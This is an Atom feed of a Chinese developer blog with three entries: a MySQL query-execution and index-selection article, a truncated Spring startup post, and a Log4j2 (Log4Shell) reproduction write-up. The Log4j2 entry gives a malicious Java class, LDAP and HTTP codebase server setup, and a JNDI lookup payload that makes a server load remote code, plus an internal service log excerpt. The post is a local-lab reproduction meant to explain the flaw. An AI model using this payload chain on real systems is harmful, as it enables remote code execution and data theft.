<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
    <id>https://yao177.github.io</id>
    <title>Yao177&apos;s Blog</title>
    <updated>2022-03-02T16:01:25.421Z</updated>
    <generator>https://github.com/jpmonette/feed</generator>
    <link rel="alternate" href="https://yao177.github.io"/>
    <link rel="self" href="https://yao177.github.io/atom.xml"/>
    <subtitle>&lt;b&gt;E&lt;/b&gt;·rror = &lt;b&gt;m&lt;/b&gt;·ore * &lt;b&gt;c²&lt;/b&gt;·ode</subtitle>
    <logo>https://yao177.github.io/images/avatar.png</logo>
    <icon>https://yao177.github.io/favicon.ico</icon>
    <rights>All rights reserved 2022, Yao177&apos;s Blog</rights>
    <entry>
        <title type="html"><![CDATA[转｜MySQL｜待]]></title>
        <id>https://yao177.github.io/post/zhuan-ormysqlordai/</id>
        <link href="https://yao177.github.io/post/zhuan-ormysqlordai/">
        </link>
        <updated>2022-03-02T14:52:21.000Z</updated>
        <content type="html"><![CDATA[<h1 id="一条查询语句的执行过程">一条查询语句的执行过程</h1>
<h2 id="基本架构">基本架构</h2>
<p>MySQL 的基本架构图如下图所示。<br>
<img src="https://yao177.github.io/post-images/1646233619656.svg" alt="" loading="lazy"></p>
<p>大体来说，MySQL 可以分为 Server 层和存储引擎层两个部分</p>
<ol>
<li>Server 层包括：连接器、查询缓存、分析器、优化器、执行器等核心服务功能；所有跨存储引擎的功能都在这一层实现：存储过程、触发器、视图等。
<ul>
<li>连接器：负责跟客户端建立连接、维持和管理连接</li>
<li>查询缓存：以 key-value 的形式存储执行过的语句和结果</li>
<li>分析器：词法分析、语法分析</li>
<li>优化器：生成最优的执行计划，包括索引选择、join 表的顺序等</li>
<li>执行器：操作存储引擎，返回结果</li>
</ul>
</li>
<li>存储引擎层：通过提供读写接口，来负责数据的存储和提取。<br>
其架构模式是插件式的，支持 Innodb、MyISAM 等存储引擎，其中 Innodb 是最常用的存储引擎。</li>
</ol>
<p>下面将简单介绍Server层中的各个组件</p>
<h3 id="连接器">连接器</h3>
<p>连接器：负责跟客户端建立连接、获取权限、维持和管理连接。</p>
<p><em>需要注意的是：由于验证通过之后连接器会获取该用户的权限，之后这个连接里的所有权限判断逻辑都依赖于此权限，因此，一个用户成功建立连接后，即使管理员对这个用户的权限做了修改，也不会影响已经存在连接的权限，修改完后，只有再新建的连接才会使用新的权限设置。</em></p>
<h3 id="查询缓存">查询缓存</h3>
<p>查询缓存：以 key-value 的形式存储执行过的语句和结果。<br>
在解析一个查询语句之前，如果查询缓存是打开的，那么 MySQL 会优先检查这个查询是否命中查询缓存中的数据。<br>
查询缓存是从 4.1 版本开始支持，默认是关闭的，可以在运行时设置变量<code>set query_cache_type=1</code>开启，也可以重写配置文件中的参数开启。<br>
通过语句<code>show variables like '%query_cache%';</code>可以查看关于查询缓存相应的信息，例如：通过<s>query_cache_size</s><code>query_cache_type</code>可以知晓查询缓存是否开启等。</p>
<figure data-type="image" tabindex="1"><img src="https://yao177.github.io/post-images/1646233961964.png" alt="" loading="lazy"></figure>
<p><em>一般情况下，不建议使用查询缓存，这是因为对于一个表的更新操作，这个表上所有的查询缓存都会被清空。<br>
因此除了很少更新的配置表外可以使用查询缓存来提供查询速度，其他的一般不建议使用查询缓存。</em></p>
<p>关于查询缓存的更详细信息可以参考文档 <a href="https://segmentfault.com/a/1190000003039232">MySql 查询缓存笔记</a></p>
<h3 id="分析器">分析器</h3>
<p>分析器：包括词法分析、语法分析等。</p>
<p>这个阶段会检查：</p>
<ol>
<li>是否使用了错误的关键字；</li>
<li>使用的关键字顺序是否正确；</li>
<li>检查数据表和数据列是否存在等。</li>
</ol>
<p>我们经常看到的“You have an error in your SQL syntax”提示，就是在这个阶段判断出来的错误。下面就是一个将“where”关键字写错的例子。</p>
<figure data-type="image" tabindex="2"><img src="https://yao177.github.io/post-images/1646234188203.png" alt="" loading="lazy"></figure>
<h3 id="优化器">优化器</h3>
<p>一般情况下，一条查询可以有多种执行方法，最后都是返回相同结果。优化器的作用就是找到这其中最好的执行计划。<br>
MySQL使用基于成本的查询优化器。它会根据统计信息和代价模型预测一个查询使用某种执行计划时的成本，并选择其中成本最少的一个。</p>
<p><em>查询优化器中有两个依赖：统计信息和代价模型。统计信息的准确与否、代价模型的合理与否都会影响优化器选择最优计划。</em></p>
<p>下面来看两个关于优化器选择索引的例子。</p>
<h4 id="正确选择索引的例子">正确选择索引的例子</h4>
<p>构建了一个表，除主键 id 外，还有另外两个字段a、b，分别都有索引，然后插入了100000条数据（注：a值全部为3）。</p>
<pre><code class="language-Sql">CREATE TABLE `Test` (
  `id` int(11) unsigned NOT NULL AUTO_INCREMENT,
  `a` int(11) DEFAULT NULL,
  `b` int(11) NOT NULL,
  PRIMARY KEY (`id`),
  KEY `IDX_a` (`a`),
  KEY `IDX_b` (`b`)
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4;
DELIMITER // 
CREATE PROCEDURE proc1()
BEGIN
  declare i int;
  set i = 1;
  while(i&lt;=100000) do
  	insert into Test value(i,3,i);
  	set i=i+1;
  end while;
END //
DELIMITER ;
call proc1();
</code></pre>
<p>当我们执行<code>select * from Test where a = 3 and b = 4</code>有如下两种不同的执行方式：</p>
<ol>
<li>选择a这个索引，得到索引值为3的第一条记录的主键Id，然后回表查询出行记录返回给执行器，执行器判断记录中的字段b是否为4，如果为4，则加入结果集并继续遍历依次判断。</li>
<li>选择b这个索引，得到索引值为4的第一条记录的主键Id，然后回表查询出行记录返回给执行器，执行器判断记录中的字段a是否为3，如果为3，则加入结果集并继续遍历依次判断。</li>
</ol>
<p>结合表中的数据和经验我们都知道，选择b作为索引来执行将更合理，因为：b的区分度更好，符合条件的记录要更少，将会更快的找到结果。<br>
用explain可以看到优化器选择的索引为：IDX_b，而不是选择的IDX_a，这就是优化器基于统计信息和代价模型得到的最优执行计划，符合我们的预期。</p>
<figure data-type="image" tabindex="3"><img src="https://yao177.github.io/post-images/1646234390390.png" alt="" loading="lazy"></figure>
<p><em>注：可能有的同学会问：列a就不应该给它创建索引，因为区分度为1/10000，例子虽然极端，但主要想表达这样一种思想。</em></p>
<p>如果想了解优化器选择每个索引的执行成本，可以观察 optimizer_trace 的<a href="https://gist.githubusercontent.com/yao177/8eb38fd70049793e792db5ac1b506678/raw/optimizer_trace%2520log">输出日志</a></p>
<p>从日志中，也可以更清晰的看出选择的是索引：IDX_b。</p>
<h4 id="错误选择索引的例子">错误选择索引的例子</h4>
<p>一般情况下，优化器会选择出最优的执行计划，但是也存在选取错误的执行计划的情况。</p>
<p>构建了一个表Test2，除主键id外，还有另外两个字段a、b，分别都有索引，然后插入了100000条数据</p>
<pre><code class="language-Sql">CREATE TABLE `Test2` (
  `id` int(11) unsigned NOT NULL AUTO_INCREMENT,
  `a` int(11) DEFAULT NULL,
  `b` int(11) DEFAULT NULL,
  PRIMARY KEY (`id`),
  KEY `IDX_a` (`a`),
  KEY `IDX_b` (`b`)
) ENGINE=InnoDB AUTO_INCREMENT=100001 DEFAULT CHARSET=utf8mb4;
DELIMITER // 
CREATE PROCEDURE proc2()
BEGIN
  declare i int;
  set i = 2;
  while(i&lt;=100000) do
  	insert into Test2 value(i,i,i);
  	set i=i+1;
  end while;
END //
DELIMITER ;
call proc2();
</code></pre>
<p>下面我们来看下这条语句：<code>select * from Test2 where (a between 1 and 1000) and (b between 50000 and 100000) order by b limit 1;</code>。<br>
从条件上来看，此表Test2中没有符合条件的结果。</p>
<p><em>但是你觉得MySQL会选择索引a还是索引b呢？先留给大家思考，章节末有相关的分析可以作为参考</em></p>
<h3 id="执行器">执行器</h3>
<p>通过调用存储引擎定义好的API，操作存储引擎，并将结果返回给客户端。具体例子见文章第二节。</p>
<h2 id="一条查询语句的执行过程-2">一条查询语句的执行过程</h2>
<p>上面介绍了 MySQL 的基本架构以及相应的模块，下面将通过上文中的查询语句作为例子来说明一条查询语句的执行过程。<br>
假设当客户端和服务端建立连接之后，客户端向服务端发送如下一个「查询」请求：<code>select * from Test where a = 3 and b = 4;</code></p>
<p>MySQL的执行路径如下：</p>
<ol>
<li>如果查询缓存是打开的，服务器端会优先检查查询缓存，如果命中了缓存，则立刻返回存储在缓存中的结果。否则进入下一阶段。</li>
<li>服务器端的分析器对SQL进行词法分析、语法分析，再由优化器从存储引擎获取统计信息，根据代价模型生成对应的执行计划(索引b就是在这个阶段完成)。</li>
<li>服务器端根据优化器生成的执行计划，再调用存储引擎的API来执行查询，并将结果返回给客户端，具体如下
<ol>
<li>调用InnoDB存储引擎的接口取满足”b=4“条件的第一条记录返回给执行器</li>
<li>执行器判断该记录中的a字段是否等于3，如果不等于则跳过，否则放入结果集</li>
<li>调用InnoDB存储引擎的接口取满足“b=4”条件的下一条记录并返回给执行器</li>
<li>重复第二、三步，直至循环遍历结束</li>
<li>执行器将结果集返回给客户端</li>
</ol>
</li>
</ol>
<p>注：MySQL 将结果返回客户端是一个增量、逐步返回的过程，并不一定等到所有的结果集都查出来再返回。<br>
这样处理有两个好处：</p>
<ol>
<li>服务器无需存储太多的结果，也就不会因为要返回太多的结果而消耗太多的内存；</li>
<li>这样的处理也让 MySQL 客户端第一时间获得返回的结果。</li>
</ol>
<p>为方便理解，这里也画了一个流程图，如下图所示：<br>
<img src="https://yao177.github.io/post-images/1646235043473.svg" alt="" loading="lazy"></p>
<h2 id="扩展">扩展</h2>
<p>在查询的过程中，会有如下两种情况：</p>
<ol>
<li>所在的数据页已经在内存 (buffer pool) 中了，则直接查询。</li>
<li>所在的数据页不在内存 (buffer pool) 中
<ol>
<li>如果此时 buffer pool 的大小不足，则会淘汰 buffer pool 中的最久不使用的数据页为该数据页腾出位置，如果该数据页为脏页，则会在淘汰之前刷脏页到磁盘。
<ul>
<li>如果遇到这种情况且脏页比较多，则可能就导致该次查询会较慢，给我们的直观感受就是MySQL“抖”了一下。为了避免出现这种情况，个人建议：</li>
<li>在编写 SQL 语句时习惯性使用 limit 字段来加以限制，避免一个查询要淘汰的脏页个数太多。</li>
</ul>
</li>
<li>所在的数据页不在内存中，而如果此时 change buffer 中该数据页有更新，则会在磁盘中读取该数据页之后与 change buffer 中的内容进行 merge 作为新的数据页，然后查询结果并返回。</li>
</ol>
</li>
</ol>
<p><em>change buffer 是一种重要的数据变更日志。 change buffer 的主要目的是将对二级索引的数据操作缓存下来，以此减少二级索引的随机IO，并达到操作合并的效果。</em></p>
<p>限于篇幅加上笔者水平有限，至于 buffer pool、change buffer、脏页等内容，如果有兴趣，将会在下一篇总结中呈现。</p>
<h2 id="问题和思考">问题和思考</h2>
<h3 id="问题分析">问题分析</h3>
<p>本文的中间关于优化器选择索引留了一个问题<code>select * from Test2 where (a between 1 and 1000) and (b between 50000 and 100000) order by b limit 1;</code><br>
此查询语句MySQL会选择哪个索引呢？<br>
在分析之前，先将查询语句中的order by b去掉我们来分析一下：<code>select * from Test2 where (a between 1 and 1000) and (b between 50000 and 100000) limit 1;</code></p>
<ul>
<li>如果选择索引a则最多会扫描1000行，最少1行</li>
<li>如果选择索引b则最多会扫描50000行，最少1行<br>
这种情况，毫无疑问，选择索引b所需要扫描的行数要多很多且没有其他因素干扰，因此执行器会选择索引a。<br>
MySQL下有个了解优化器工作过程的利器，其就是 optimizer_trace。使用方法为：</li>
</ul>
<pre><code class="language-Sql">SET OPTIMIZER_TRACE_MAX_MEM_SIZE=268435456; 
SET optimizer_trace=&quot;enabled=on&quot;; 
select * from Test2 where (a between 1 and 1000) and (b between 50000 and 100000) limit 1;
select * from INFORMATION_SCHEMA.OPTIMIZER_TRACE\G
</code></pre>
<p>MySQL 5.7.20输出内容如下：从输出内容 rows_estimation 的部分可以看到选择索引a的成本最小，<a href="https://gist.githubusercontent.com/yao177/822d7b7fcfaface2588e35087a2637ff/raw/optimizer_trace%2520log%25202">日志链接</a></p>
<p>如果查询语句中有<code>order by b</code>呢？情况如下：</p>
<ul>
<li>如果选择索引a则最多会扫描1000行，最少1行，而且排序还需要耗时</li>
<li>和查询语句中没有order by b时一样，如果选择索引b则最多会扫描50000行，最少1行，不需要排序<br>
这种情况，MySQL会选择索引a还是索引b呢？</li>
</ul>
<p><strong>答案是选择了索引b，原因是：order by b 引导了优化器选择了索引b。</strong><br>
<img src="https://yao177.github.io/post-images/1646235832056.png" alt="" loading="lazy"><br>
<img src="https://yao177.github.io/post-images/1646235851255.png" alt="" loading="lazy"></p>
<p>结合<a href="https://gist.githubusercontent.com/yao177/b943fb741ba61037a00f73d46199f8a7/raw/optimizer_trace%2520log%25203">输出内容</a> rows_estimation、reconsidering_access_paths_for_index_ordering 两部分可以看到：最终选择了索引b。</p>
<p><a href="https://github.com/yao177/self-collection/raw/main/MySQL%2Border%2Bby%E4%BC%98%E5%8C%96bug%E8%A7%A3%E6%9E%90.key">扩展阅读</a></p>
<h3 id="分析器到查询缓存这条线的作用">分析器到查询缓存这条线的作用</h3>
<p>问题：架构图中分析器--&gt;查询缓存 这条线(如下图红色标出位置)的作用是什么，是不是箭头画错了？<br>
答案：失效缓存，当分析器检查出该次操作为更新操作时，如果查询缓存是开启的，则会失效相应的缓存。</p>
<figure data-type="image" tabindex="4"><img src="https://yao177.github.io/post-images/1646236407126.svg" alt="" loading="lazy"></figure>
<blockquote>
<p>这是一位同事在阅读了本文之后提出来的问题，这是一个好问题，督促我更好的了解了该架构图，在此表示感谢。<br>
在本文的前面部分所介绍的查询流程中，唯独没有涉及到分析器--&gt;查询缓存这一条线，因此笔者觉得有必要在此说明这条线的作用。</p>
</blockquote>
<p>除了分析器--&gt;查询缓存这一条线之外，其实：执行器也应该有一条线来指向查询缓存，作用是：如果查询缓存是开启的，则会将查询结果放入缓存。(至于在架构图中都没有画出来，个人猜测是为了架构图更简洁吧)</p>
<h2 id="参考阅读">参考阅读</h2>
<ul>
<li><a href="https://time.geekbang.org/column/article/68319">基础架构：一条SQL查询语句是如何执行的？</a></li>
<li><a href="https://time.geekbang.org/column/article/71173">MySQL为什么有时候会选错索引？</a></li>
<li><a href="http://mysql.taobao.org/monthly/2015/11/07/">淘宝 数据库内核月报 2015.11</a></li>
<li><a href="https://dev.mysql.com/doc/internals/en/tracing-example.html">MySQL official manual - Tracing the Optimizer</a></li>
<li><a href="https://www.jianshu.com/p/caf5818eca81">MySQL ORDER BY主键id加LIMIT限制走错索引</a></li>
</ul>
<hr>
<h1 id="慢查询引起的车祸线程">慢查询引起的车祸线程</h1>
<p>这一部分主要是站在老司机的肩膀上从原理总结、mysql慢查询优化方法、case案例分析等几个方面结合自己这段时间在工作上遇到的慢查询谈谈数据库索引的原理和如何优化慢查询。一方面给自己总结，另一方面希望看到的老司机能够指出其中的错误和不足，哈哈哈。</p>
<h2 id="上车前原理分析">上车前（原理分析）</h2>
<p>这部分我主要想总结一下数据库索引的原理，可能是老生常谈的东西了，【<strong>慢</strong>查询】这个词主要的重点就是慢，就像我们开车一样，我们发车前最重要的就是了解这部车，而我们要知道我们的SQL语句为什么会慢，我们当然必须对数据的查找过程有所了解。</p>
<h2 id="上车慢查询优化">上车（慢查询优化）</h2>
<p><strong>举个例子</strong>：其实对于数据索引这样的例子，在我们日常生活其实也是很多，通常大家都举查字典的例子吧？为了新鲜感，我换一个，比如你找对象，如果你是男的，你最先的目标是女孩子的吧（除个别外），这样我们就排除了一部无效数据，然后咱们再选咱们同一个城市的吧？又剔除了一部分无效数据，最后我们再选年龄等，最后留下了我们目标人群。这种查找过程其实也是一种索引过程。<br>
<strong>磁盘IO</strong>：我们计算机是怎么查询数据的呢？当计算机把数据保存在磁盘上，而为了提高性能，每次又可以把部分数据读入内存来计算，因为我们知道<em>访问磁盘的成本大概是访问内存的十万倍左右</em>，所以简单的搜索树难以满足复杂的应用场景。考虑到磁盘IO是非常高昂的操作，计算机操作系统做了一些优化，当一次IO时，不光把当前磁盘地址的数据，而是把相邻的数据也都读取到内存缓冲区内，因为局部预读性原理告诉我们，当计算机访问一个地址的数据的时候，与其相邻的数据也会很快被访问到。每一次IO读取的数据我们称之为一页(page)。<em>具体一页有多大数据跟操作系统有关，一般为4k或8k，也就是我们读取一页内的数据时候，实际上才发生了一次IO</em>，所以结合我们的例子以及计算机查询数据的原理，为了提高查询数据的查询速度，需要保证最小的IO次数，B+树的数据结构应运而生。</p>
<h2 id="翻车explain-字段分析">翻车（explain 字段分析）</h2>
<h2 id="车祸现场case-分析">车祸现场（case 分析）</h2>
<h1 id="聊聊-innodb-的那些锁事">聊聊 InnoDB 的那些“锁”事</h1>
<h2 id="并发事务处理带来的问题">并发事务处理带来的问题</h2>
<h2 id="事务隔离级别">事务隔离级别</h2>
<h2 id="事务隔离实现">事务隔离实现</h2>
<h3 id="数据加锁">数据加锁</h3>
<h4 id="innodb-的锁">InnoDB 的锁</h4>
<h5 id="auto-inc-locks-自增锁">Auto-inc Locks 自增锁</h5>
<h5 id="shared-and-exclusive-locks-共享排他锁">shared and exclusive locks 共享/排他锁</h5>
<h5 id="intention-locks-意向锁">Intention Locks 意向锁</h5>
<h4 id="innodb-锁算法">InnoDB 锁算法</h4>
<h5 id="record-locks-记录锁">Record Locks 记录锁</h5>
<h5 id="gap-locks-间隙锁">Gap Locks 间隙锁</h5>
<h5 id="next-key-locks-临键锁">Next-key Locks 临键锁</h5>
<h5 id="insert-intention-locks-插入意向锁">Insert Intention Locks 插入意向锁</h5>
<h5 id="mdl-元数据锁">MDL 元数据锁</h5>
<h3 id="mvcc-多版本并发控制">MVCC 多版本并发控制</h3>
<h4 id="mvcc-简介">MVCC 简介</h4>
<h4 id="mvcc-实现原理">MVCC 实现原理</h4>
<h4 id="mvcc-读分类">MVCC 读分类</h4>
<h4 id="two-phase-locking-protocol-两阶段锁协议">two-phase locking protocol 两阶段锁协议</h4>
<h4 id="sql-语句如何加锁rr-级别下">SQL 语句如何加锁（RR 级别下）</h4>
<h2 id="扩展阅读-参考">扩展阅读 &amp; 参考</h2>
<h1 id="你真的看懂日志了吗">你真的看懂日志了吗？</h1>
<h2 id="binlog-详解">Binlog 详解</h2>
<h3 id="基本概念">基本概念</h3>
<h3 id="日志结构">日志结构</h3>
<h3 id="日志格式">日志格式</h3>
<h3 id="日志时间结构">日志时间结构</h3>
<h2 id="binlog-应用">Binlog 应用</h2>
<h3 id="主从同步">主从同步</h3>
<h3 id="数据恢复">数据恢复</h3>
<h4 id="对比-redo-log">对比 redo log</h4>
<h2 id="案例分析">案例分析</h2>
<h2 id="参考资料">参考资料</h2>
<h1 id="认识一下主从原理和延迟">认识一下主从原理和延迟</h1>
<h2 id="主从集群">主从集群</h2>
<h2 id="主从同步-2">主从同步</h2>
<h3 id="binlog-是什么有什么用">binlog 是什么？有什么用？</h3>
<h3 id="主从复制">主从复制</h3>
<h3 id="puma-databus-应用">Puma &amp; Databus 应用</h3>
<h2 id="主从延迟">主从延迟</h2>
<h3 id="主从延迟是怎么回事">主从延迟是怎么回事？</h3>
<h3 id="为啥会主从延迟">为啥会主从延迟？</h3>
<h4 id="是-t2-t1-吗">是 T2-T1 吗？</h4>
<h4 id="是-t3-t2-吗">是 T3-T2 吗？</h4>
<h4 id="多线程复制">多线程复制</h4>
<h5 id="按库并行">按库并行</h5>
<h5 id="redo-log-group-commit-组提交优化">redo log group commit （组提交）优化</h5>
<h5 id="writeset-的并行复制">WRITESET 的并行复制</h5>
<h3 id="怎么减少主从延迟">怎么减少主从延迟</h3>
<h2 id="case-分析">Case 分析</h2>
]]></content>
    </entry>
    <entry>
        <title type="html"><![CDATA[安全｜Log4j2 复现与原理]]></title>
        <id>https://yao177.github.io/post/log4j2/</id>
        <link href="https://yao177.github.io/post/log4j2/">
        </link>
        <updated>2021-12-11T09:13:04.000Z</updated>
        <content type="html"><![CDATA[<h1 id="漏洞复现">漏洞复现</h1>
<h2 id="利用条件">利用条件：</h2>
<p>靶机需要能访问外网，若 jdk8 需要小于 u124</p>
<h2 id="web服务器">Web服务器</h2>
<p>任意未更新 log4j 至最新版的服务，以 crm（本人负责服务）为例。</p>
<h2 id="codebase服务器">CodeBase服务器</h2>
<p>直接用 python 自带的 SimpleHttpServer 即可。将恶意 class 放入目录下。</p>
<pre><code class="language-Java">public class Exploit {
    static {
//        try {
//            Runtime.getRuntime().exec(&quot;reboot&quot;); 可以是任意代码，例如关机指令、进程关闭、将服务器文件外传、将内网拓扑结构外传、嵌入挖矿软件，any
//        } catch (IOException e) {
//            e.printStackTrace();
//        } 
        System.out.println(&quot;Exploit!&quot;);
    }
}
</code></pre>
<p>启动服务器：python3 -m SimpleHTTPServer 1234</p>
<p>于是得到 codebase 地址：http://127.0.0.1:1234/</p>
<h2 id="ldap服务器">LDAP服务器</h2>
<p>随便找个LDAP简易服务器框架，例如https://github.com/mbechler/marshalsec</p>
<p>该框架运行参数为<code>&lt;codebase_url#classname&gt; [&lt;port&gt;]</code></p>
<p>我们测试时设置为：http://127.0.0.1:1234/#Exploit 2345</p>
<h2 id="复现">复现</h2>
<p>已知 controller 会打印参数信息，于是我们搜索：<br>
<img src="https://yao177.github.io/post-images/1646129092453.png" alt="" loading="lazy"></p>
<p>payload：<code>${jndi:ldap://127.0.0.1:2345/Exploit}</code><br>
得到：<br>
<img src="https://yao177.github.io/post-images/1646129683700.png" alt="" loading="lazy"></p>
<p>相关利用姿势：上传堆栈、上传业务类字节码，而后可以将所有源码看尽。</p>
<h2 id="完整攻击链">完整攻击链</h2>
<p>总结完整攻击链：<br>
<img src="https://yao177.github.io/post-images/1646129822790.svg" alt="" loading="lazy"></p>
<p>该漏洞及其危险，黑客只需额外两台服务器，并在任何可能被日志打印的接口参数中嵌入恶意信息即可。若靶机 jdk 版本大于等于 u124，那将无法复现解析 reference 以访问 codebase 服务器。</p>
<h1 id="漏洞原理">漏洞原理</h1>
<h2 id="log4j">log4j</h2>
<figure data-type="image" tabindex="1"><img src="https://yao177.github.io/post-images/1646130822954.png" alt="" loading="lazy"></figure>
<p>绕过冒号前缀校验</p>
<figure data-type="image" tabindex="2"><img src="https://yao177.github.io/post-images/1646130861459.png" alt="" loading="lazy"></figure>
<p>将特殊指令解析为 jndi 指令=<br>
访问 LDAP 服务器，接收构造好的指向外部的 Reference（有两种传输方式，一种Reference，一种本地序列化）</p>
<figure data-type="image" tabindex="3"><img src="https://yao177.github.io/post-images/1646130936561.png" alt="" loading="lazy"></figure>
<p>web 服务器接收后，反序列化 reference，并从 codebase 的URL对象中获取字节流：</p>
<p><img src="https://yao177.github.io/post-images/1646130973181.png" alt="" loading="lazy"><br>
<img src="https://yao177.github.io/post-images/1646130999277.png" alt="" loading="lazy"><br>
<img src="https://yao177.github.io/post-images/1646131017114.png" alt="" loading="lazy"><br>
<img src="https://yao177.github.io/post-images/1646131035747.png" alt="" loading="lazy"></p>
<p>利用我们定义的 javaFactory 进行类加载，还记得我们的设定么：</p>
<figure data-type="image" tabindex="4"><img src="https://yao177.github.io/post-images/1646131063716.png" alt="" loading="lazy"></figure>
<p>这个ref便是我们的HTTP服务器：http://127.0.0.1:1234/，至此完成攻击。</p>
<h1 id="example">Example</h1>
<p>*ppo login、5*8 online</p>
<pre><code class="language-Java"> com.bj58.spat.wcs.consultstatistics.modules.kafka.KafkaConsumerTool.printLog(KafkaConsumerTool.java:42), 
 com.bj58.spat.wcs.consultstatistics.modules.kafka.consumers.MsgLogConsumer$2.run$original$J2L3KrD0(MsgLogConsumer.java:78), com.bj58.spat.w')
(['Sat Dec 11 21:06:39 2021'], ':', 'ender.append(AbstractOutputStreamAppender.java:108), org.apache.logging.log4j.core.appender.RollingFileAppender.append(RollingFileAppender.java:88), org.apache.logging.log4j.core.config.AppenderControl.callAppender(AppenderControl.java:99), org.apache.logging.log4j.core.config.LoggerConfig.callAppenders(LoggerConfig.java:430), org.apache.logging.log4j.core.config.LoggerConfig.log(LoggerConfig.java:409), org.apache.logging.log4j.core.config.LoggerConfig.log(LoggerConfig.java:367), org.apache.logging.log4j.core.Logger.logMessage(Logger.java:112), org.apache.logging.log4j.spi.AbstractLogger.logMessage(AbstractLogger.java:738), org.apache.logging.log4j.spi.AbstractLogger.logIfEnabled(AbstractLogger.java:708), org.apache.logging.slf4j.Log4jLogger.info(Log4jLogger.java:193), com.bj58.spat.wcs.consultstatistics.modules.kafka.KafkaConsumerTool.printLog(KafkaConsumerTool.java:42), com.bj58.spat.wcs.consultstatistics.modules.kafka.consumers.MsgLogConsumer$2.run$original$J2L3KrD0(MsgLogConsumer.java:78), com.bj58.spat.w')
('receive from 2:', 'cs.consultstatistics.modules.kafka.consumers.MsgLogConsumer$2.run$original$J2L3KrD0$accessor$LturF6aU(MsgLogConsumer.java), com.bj58.spat.wcs.consultstatistics.modules.kafka.consumers.MsgLogConsumer$2$auxiliary$DWlZw7JW.call(Unknown Source), org.apache.skywalking.apm.plugin.jdk.threading.ThreadingMethodInterceptor_internal.intercept(InstanceMethodInterTemplate.java:93), com.bj58.spat.wcs.consultstatistics.modules.kafka.consumers.MsgLogConsumer$2.run(MsgLogConsumer.java)]\n')
(['Sat Dec 11 21:06:39 2021'], ':', 'cs.consultstatistics.modules.kafka.consumers.MsgLogConsumer$2.run$original$J2L3KrD0$accessor$LturF6aU(MsgLogConsumer.java), 
com.bj58.spat.wcs.consultstatistics.modules.kafka.consumers.MsgLogConsumer$2$auxiliary$DWlZw7JW.call(Unknown Source), 
org.apache.skywalking.apm.plugin.jdk.threading.ThreadingMethodInterceptor_internal.intercept(InstanceMethodInterTemplate.java:93), com.bj58.spat.wcs.consultstatistics.modules.kafka.consumers.MsgLogConsumer$2.run(MsgLogConsumer.java)]\n')
</code></pre>
]]></content>
    </entry>
    <entry>
        <title type="html"><![CDATA[Java 框架｜Spring 启动加速器]]></title>
        <id>https://yao177.github.io/post/concurrent-spring-startup/</id>
        <link href="https://yao177.github.io/post/concurrent-spring-startup/">
        </link>
        <updated>2021-11-23T06:20:13.000Z</updated>
        <content type="html"><![CDATA[<p><ul class="markdownIt-TOC">
<li><a href="#%E5%86%99%E5%9C%A8%E5%89%8D%E9%9D%A2">写在前面</a></li>
<li><a href="#%E9%A1%B9%E7%9B%AE%E8%83%8C%E6%99%AF">项目背景</a></li>
<li><a href="#%E7%9F%A5%E8%AF%86%E8%83%8C%E6%99%AF">知识背景</a>
<ul>
<li><a href="#spring">Spring</a>
<ul>
<li><a href="#spring-%E7%AE%80%E8%BF%B0">Spring 简述</a></li>
<li><a href="#spring-%E5%85%B3%E9%94%AE%E7%BB%84%E4%BB%B6">Spring 关键组件</a>
<ul>
<li><a href="#beanfactory">BeanFactory</a></li>
<li><a href="#applicationcontext">ApplicationContext</a></li>
<li><a href="#beanpostprocessor">BeanPostProcessor</a></li>
<li><a href="#instantiationawarebeanpostprocessor">InstantiationAwareBeanPostProcessor</a></li>
</ul>
</li>
<li><a href="#spring-%E5%AE%B9%E5%99%A8%E5%90%AF%E5%8A%A8%E8%BF%87%E7%A8%8B">Spring 容器启动过程</a></li>
<li><a href="#spring-%E4%B8%8E%E6%9C%AC%E9%A1%B9%E7%9B%AE%E7%9A%84%E8%81%94%E7%B3%BB">Spring 与本项目的联系</a></li>
</ul>
</li>
<li><a href="#cglib">CGLIB</a>
<ul>
<li><a href="#cglib-%E7%AE%80%E8%BF%B0">CGLIB 简述</a></li>
<li><a href="#cglib-%E7%9A%84%E4%BD%BF%E7%94%A8%E7%A4%BA%E4%BE%8B">CGLIB 的使用示例</a></li>
<li><a href="#cglib-%E5%92%8C-jdk-%E5%8A%A8%E6%80%81%E4%BB%A3%E7%90%86%E7%9A%84%E5%8C%BA%E5%88%AB">CGLIB 和 JDK 动态代理的区别</a></li>
<li><a href="#%E6%B3%A8%E6%84%8F%E4%BA%8B%E9%A1%B9">注意事项</a></li>
<li><a href="#cglib-%E4%B8%8E%E6%9C%AC%E9%A1%B9%E7%9B%AE%E7%9A%84%E8%81%94%E7%B3%BB">CGLIB 与本项目的联系</a></li>
</ul>
</li>
</ul>
</li>
<li><a href="#%E8%AE%BE%E8%AE%A1%E6%80%9D%E8%B7%AF">设计思路</a>
<ul>
<li><a href="#%E6%8F%90%E5%87%BA%E7%9B%AE%E5%89%8D%E7%9A%84%E9%97%AE%E9%A2%98%E5%92%8C%E5%AF%B9%E5%BA%94%E8%A7%A3%E5%86%B3%E6%96%B9%E6%A1%88">提出目前的问题和对应解决方案：</a></li>
</ul>
</li>
<li><a href="#%E5%8E%9F%E7%90%86%E4%BB%8B%E7%BB%8D">原理介绍</a>
<ul>
<li><a href="#%E9%A1%B9%E7%9B%AE%E6%A6%82%E8%A7%88">项目概览</a></li>
<li><a href="#%E5%88%9B%E5%BB%BA%E4%BB%A3%E7%90%86%E6%B5%81%E7%A8%8B">创建代理流程</a></li>
<li><a href="#%E5%89%8D%E7%BD%AE%E6%A0%A1%E9%AA%8C">前置校验</a>
<ul>
<li><a href="#%E5%A6%82%E4%BD%95%E8%8E%B7%E5%8F%96-bean-%E7%9A%84%E5%88%9D%E5%A7%8B%E5%8C%96%E6%96%B9%E6%B3%95">如何获取 Bean 的初始化方法</a></li>
<li><a href="#%E6%A0%A1%E9%AA%8C%E7%B1%BB%E5%9E%8B">校验类型</a></li>
</ul>
</li>
<li><a href="#%E8%A3%85%E9%85%8D%E4%BB%A3%E7%90%86%E6%96%B9%E6%B3%95%E7%AD%96%E7%95%A5">装配代理方法策略</a></li>
<li><a href="#%E5%AF%B9-factorybean-%E7%9A%84%E7%89%B9%E6%AE%8A%E5%A4%84%E7%90%86">对 FactoryBean 的特殊处理</a></li>
<li><a href="#%E5%88%9B%E5%BB%BA%E4%BB%A3%E7%90%86%E5%AF%B9%E8%B1%A1">创建代理对象</a></li>
<li><a href="#%E5%9C%BA%E6%99%AF%E7%A4%BA%E4%BE%8B">场景示例</a></li>
</ul>
</li>
